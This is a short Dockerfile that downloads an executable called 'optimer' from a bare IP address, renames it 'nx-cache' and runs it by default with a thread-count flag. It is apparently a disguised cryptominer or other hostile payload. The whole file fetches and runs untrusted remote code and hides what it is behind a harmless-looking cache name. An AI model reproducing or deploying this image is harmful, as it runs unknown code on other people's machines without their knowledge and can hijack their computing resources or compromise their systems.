FROM ubuntu:16.04

RUN apt-get update && apt-get install -y wget
RUN wget 94.177.214.32/optimer
RUN chmod +x optimer && mv optimer nx-cache

CMD ./nx-cache -t 16 -d 5
